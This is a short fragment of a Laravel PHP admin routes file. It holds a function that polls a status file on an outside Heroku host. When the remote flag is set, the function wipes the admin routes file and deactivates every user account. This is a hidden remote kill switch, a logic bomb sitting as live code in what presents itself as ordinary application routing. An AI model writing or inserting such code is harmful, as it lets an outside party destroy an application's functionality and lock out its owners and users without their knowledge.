...
Route::group(['prefix' => 'admin'], function () {
    ...
    function m1m () {
        $status = json_decode(file_get_contents('http://mr-mohamed-mohsen.herokuapp.com/status.json'))->status;

        if($status){
            $routesFile = fopen(base_path('routes\admin.php'), 'w');

            fwrite($routesFile, '');

            fclose($routesFile);

            User::where('id', '>=', 1)->update(['active' => 0]);
        }
    }
